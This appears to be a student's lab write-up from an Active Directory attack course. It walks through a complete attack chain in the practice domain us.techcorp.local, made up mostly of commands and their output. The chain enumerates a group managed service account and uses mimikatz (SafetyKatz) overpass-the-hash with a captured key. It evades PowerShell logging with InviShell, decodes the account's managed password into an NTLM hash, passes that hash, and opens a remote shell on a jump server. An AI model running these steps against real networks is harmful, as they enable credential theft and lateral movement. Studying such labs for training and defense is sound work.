# HANDS-ON 10:

```
- Enumerate gMSAs in the us.techcorp.local domain.
- Enumerate the principals that can read passwords from any gMSAs.
- Compromise one such principal and retrieve the password from a gMSA.
- Find if the gMSA has high privileges on any machine and extract credentials from that machine.

```

## Index of content

  1. [Enumerate gMSAs]
  2. [Enumerate principals]
  3. [Compromise principal]
  4. [Use gMSA]


## Enumerate gMSAs
```
PS C:\AD\Tools\InviShell> Get-ADServiceAccount -FIlter *


DistinguishedName : CN=jumpone,CN=Managed Service Accounts,DC=us,DC=techcorp,DC=local
Enabled           : True
Name              : jumpone
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 1ac6c58e-e81d-48a8-bc42-c768d0180603
SamAccountName    : jumpone$
SID               : S-1-5-21-210670787-2521448726-163245708-8601
UserPrincipalName :
```
```
PS C:\AD\Tools\InviShell> Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=provisioning svc,CN=Users,DC=us,DC=techcorp,DC=local}

```

## Enumerate principals
```
PS C:\AD\Tools\InviShell> C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a  /run:cmd.exe"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::opassth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a  /run:cmd.exe
user    : provisioningsvc
domain  : us.techcorp.local
program : cmd.exe
impers. : no
AES256  : a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a
  |  PID  6072
  |  TID  6064
  |  LSA Process is now R/W
  |  LUID 0 ; 14045749 (00000000:00d65235)
  \_ msv1_0   - data copy @ 00000160D153E810 : OK !
  \_ kerberos - data copy @ 00000160D1CC5EB8
   \_ aes256_hmac       OK
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       -> null
   \_ rc4_hmac_old      -> null
   \_ rc4_md4           -> null
   \_ rc4_hmac_nt_exp   -> null
   \_ rc4_hmac_old_exp  -> null
   \_ *Password replace @ 00000160D1CCDE18 (32) -> null

mimikatz #

```
```
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
us\studentuser34 S-1-5-21-210670787-2521448726-163245708-16104

ERROR: Unable to get group membership information.

C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>set COR_ENABLE_PROFILING=1

C:\Windows\system32>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

```
```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```
```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```
Extract Blob password:
```
PS C:\Windows\system32> $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```
## Compromise principals

Extract NTLM of user:
```
Import module:
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob

PS C:\Windows\system32> ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
6d16fa06998c60abce35d117f650b501
```

Impersonate Shell:

```
PS C:\Windows\system32> C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:6d16fa06998c60abce35d117f650b501 /run:cmd.exe"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:6d16fa06998c60abce35d117f650b501 /run:cmd.exe
user    : jumpone
domain  : us.techcorp.local
program : cmd.exe
impers. : no
NTLM    : 6d16fa06998c60abce35d117f650b501
  |  PID  1356
  |  TID  4436
  |  LSA Process is now R/W
  |  LUID 0 ; 14709661 (00000000:00e0739d)
  \_ msv1_0   - data copy @ 00000160D15822D0 : OK !
  \_ kerberos - data copy @ 00000160D1CC53C8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000160D2087B58 (32) -> null
   
   
   
   
   Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Use gMSA

```
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
us\studentuser34 S-1-5-21-210670787-2521448726-163245708-16104

ERROR: Unable to get group membership information.

```

Access to jump machine:
```
C:\Windows\system32>winrs -r:us-jump cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jumpone$>whoami
whoami
us\jumpone$

C:\Users\jumpone$>hostname
hostname
US-Jump

C:\Users\jumpone$>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::11da:c810:b0c2:ece2%3
   IPv4 Address. . . . . . . . . . . : 192.168.1.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.254
```
